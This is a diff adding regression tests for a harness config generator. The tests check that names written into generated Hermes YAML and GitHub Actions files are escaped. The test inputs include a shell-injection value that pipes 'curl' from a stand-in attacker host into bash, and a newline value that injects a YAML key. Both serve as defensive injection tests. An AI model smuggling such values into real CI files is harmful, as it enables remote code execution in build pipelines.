@@ -6,6 +6,7 @@ import { describe, it, expect } from 'vitest';
 import { mkdtempSync, readFileSync, existsSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
+import { execFileSync } from 'node:child_process';
 import { hostConfigFiles } from '../src/host-config.js';
 import { scaffold } from '../src/index.js';
 
@@ -43,6 +44,67 @@ describe('hostConfigFiles (ADR-045)', () => {
     const wf = hostConfigFiles('github-actions', base).find((f) => f.path.startsWith('.github/workflows/'))!;
     expect(wf.content).toContain('OPENROUTER_API_KEY:');
     expect(wf.content).toContain('ANTHROPIC_API_KEY:');
+  });
+
+  it('hermes emits a personality keyed by the harness name', () => {
+    const cfg = hostConfigFiles('hermes', base).find((f) => f.path === 'cli-config.yaml')!;
+    expect(cfg.content).toContain('demo-bot: "A demo harness."');
+  });
+
+  // Regression: `cfg.name` lands in YAML *key* position
+  // (`agent.personalities.<name>`) and is unconstrained at this type's
+  // level — a name containing `:` previously produced two top-level `:` on
+  // one line (corrupted YAML). Kept in lockstep with
+  // @metaharness/host-hermes's own yamlKey() fix and the web-ui generator's
+  // copy (ADR-027 byte-for-byte parity).
+  it('hermes escapes a harness name containing YAML-significant characters as a mapping key', () => {
+    const cfg = hostConfigFiles('hermes', { ...base, name: 'evil: name' }).find((f) => f.path === 'cli-config.yaml')!;
+    expect(cfg.content).toContain('"evil: name": "A demo harness."');
+    expect(cfg.content).not.toMatch(/^ {4}evil: name:/m);
+  });
+
+  // Regression: `cfg.name` also lands unescaped inside a *double-quoted bash
+  // string* in the github-actions composite action's `run:` line — a name
+  // containing `"` + shell metacharacters previously broke out of the
+  // `echo` string and injected an arbitrary second shell command into the
+  // generated action.yml. Same root cause and same fix shape (shellDq(),
+  // kept in lockstep with the web-ui generator's copy and the real
+  // @metaharness/host-github-actions adapter's copy — ADR-027 parity) as
+  // the hermes yamlKey() fix above.
+  //
+  // Verifies actual bash execution, not just string content: an adversarial
+  // review of the first draft of this fix found that checking for an
+  // escaped `"` in the line wasn't enough proof of safety — a plain
+  // `run: echo "..."` YAML *scalar* line still lets a name containing ` #`
+  // truncate the line as a YAML comment before bash ever sees it (silently
+  // producing a broken action.yml, not RCE, but not "safe" either). The
+  // fix moved to a `|` block literal, where `#`/`:` are inert; this test
+  // extracts the literal block body and actually runs it through bash.
+  it('github-actions neutralizes a harness name containing shell metacharacters in the composite action run: line', () => {
+    const evil = 'harness"; curl -s http://attacker.example/x | bash #';
+    const action = hostConfigFiles('github-actions', { ...base, name: evil })
+      .find((f) => f.path.endsWith('/action.yml'))!;
+    expect(action.content).toContain('run: |\n'); // block literal, not a plain scalar
+    const body = action.content.split('run: |\n')[1]!.split('\n')[0]!.trim();
+    const out = execFileSync('bash', ['-c', body], { encoding: 'utf-8' });
+    // If the payload had broken out, `curl`'s (network-failure) stderr or a
+    // 2nd echo's output would appear; the whole malicious string must come
+    // back as inert, single-line echo output instead.
+    expect(out.trim()).toBe('Running harness"; curl -s http://attacker.example/x | bash # (non-interactive)…');
+  });
+
+  // Regression: `cfg.name` also lands unescaped in the workflow.yml header
+  // *comment* (`# GitHub Actions harness: ${cfg.name}`) — a name containing
+  // a newline breaks out of the comment and injects an arbitrary top-level
+  // YAML key into the document (found by the same adversarial review pass
+  // that caught the run: line gap above — same root cause, comment
+  // position instead of bash-string position).
+  it('github-actions strips newlines from a harness name in the workflow.yml header comment', () => {
+    const evil = 'evil-harness\nrun-name: pwned-by-attacker\n#';
+    const wf = hostConfigFiles('github-actions', { ...base, name: evil })
+      .find((f) => f.path.startsWith('.github/workflows/'))!;
+    expect(wf.content.split('\n')[0]).toBe('# GitHub Actions harness: evil-harness run-name: pwned-by-attacker #');
+    expect(wf.content).not.toMatch(/^run-name:/m);
   });
 
   it('pi-dev emits trust.json + copilot emits copilot-instructions.md', () => {
